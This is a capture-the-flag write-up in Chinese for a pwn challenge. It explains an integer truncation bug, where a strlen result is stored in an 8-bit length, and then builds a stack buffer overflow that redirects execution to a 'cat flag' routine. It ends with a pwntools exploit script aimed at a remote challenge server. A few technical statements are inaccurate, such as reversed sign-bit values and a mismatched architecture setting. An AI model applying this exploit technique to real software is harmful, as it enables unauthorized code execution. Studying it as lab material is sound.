https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5058&page=1

# 分析

整数溢出
int_overflow

整数分为有符号(int)和无符号(unsigned int)两种类型
有符号数以最高位作为其符号位
即正整数最高位为 1，负数为 0
无符号数取值范围为非负数
常见各类型占用字节数如下：
类型 字节 取值范围
int 4 -2147483648~2147483647
short int 2 -32768~32767
long int 4 -2147483648~2147483647
unsigned int 4 0~4294967295
unsigned short int 2 0~65535
unsigned long int 4 0~4294967295

也就是说，对于一个2字节的unsigned short int型变量
它的有效数据长度为两个字节
当它的数据长度超过两个字节
就溢出，溢出的部分则直接忽略
使用相关变量时，使用的数据仅为最后2个字节
因此就会出现65539等于3的情况
其他类型变量和数值与之类似。

造成输出错误的原因在于把32 bit的int整数赋值给16bit的unsign short整数，赋值后只会取数值的后16bit值，高位截断，造成整数溢出

0B = 二进制
bin(65535) =‘000b 1111 1111 1111 1111’
bin(65539) = ‘0001 0000 0000 0000 0011’
bin(3) = ‘0000 0000 0000 0000 0011’

可以看到 bin(65539) 最终的值为0011 bin(3)也相同
RELRO:Partial RELRO


在mian函数中看到调用login函数其他的地方没问题

好像也没什么问题 但是出现了危险函数 check_passwd

首先 v3 设置了一个 unsigned _int8 v3 无符号 8位参数
v3 = 0 ~ 255
然后 v3 = strlen(s);
unsigned _init8 v3; 长度最大为8位 255
len是个unsigned int 8，而strlen()返回值是一个size_t类型的变量，它是无符号32bit的。

在第7行赋值的过程中，编译器会截断后者的末八位赋值给前者。8位的最大值是 255 ，所以如果passwd字符串长度
超过255就会导致溢出.



看到上一层 read读取的时候 可以读取到0x199位数据 远远大于 255


所以存在整数型溢出漏洞.

因为 溢出部分会将后八位赋值给前面 所以 在 255的基础上 加上 原本限制的4 - 8
在溢出后将255多余的部分赋值给v3 然后就能绕过if判断.

**259 - 264**

算取偏移值

首先看到 我们再绕过if 进入else以后 然后 将s的值赋值给dest然后进行赋值


可以看到 s 入栈以后 到 dest 系统stack默认分配了14个字节给dest
stack中给出的保存passwd的大小为0x14 :

再通过看汇编源码发现最后还有一个leave出栈 需要在多加4个字节

从汇编代码中可以看到，想要覆盖到返回地址，先使用0x14 个数据覆盖stack拷贝的passed的内存区域，然后使用4字节数据覆盖ebp，再使用"cat flag"的地址覆盖返回地址，最后接上262剩余的数据即可。
（1）ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。

（2）EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。

先用 0x14 覆盖掉 stack给dest 也就是 passwd分配的空间 然后 再用四个字节覆盖掉EBP 然后再将返回地址 用 catflag地址覆盖掉 最后将262个剩余的数据接上即可.

取用 262个字节 第一部分 0x14 stack给passwd分配的空间第二部分 0x4 leave分配的4个字节 第三部分 cat flag 占用的 十个字节第四部分 262减去占用的 剩下的部分/payload = ‘A’ * 0x14 + ‘a’ * 0x4 + p32(cat_flag_address) + ‘B’ * 234
p32/64 = 对数据进行打包 转换为2进制数据

```python
from pwn import *

context.log_level = "debug"
context.arch = "amd64"

sh = remote('111.200.241.244', 57354)


payload = b'a' * 0x14 + b'a'*0x4 + p32(0x804868B)

#ljust 返回一个原字符串左对齐,并使用空格填充至指定长度的新字符串。如果指定的长度小于原字符串的长度则返回原字符串。
payload = payload.ljust(260, b'a')

sh.recvuntil("Your choice:")
sh.sendline('1')
sh.recvuntil("Please input your username:")
sh.sendline('a')
sh.recvuntil("Please input your passwd:")
sh.sendline(payload)
sh.interactive()
```

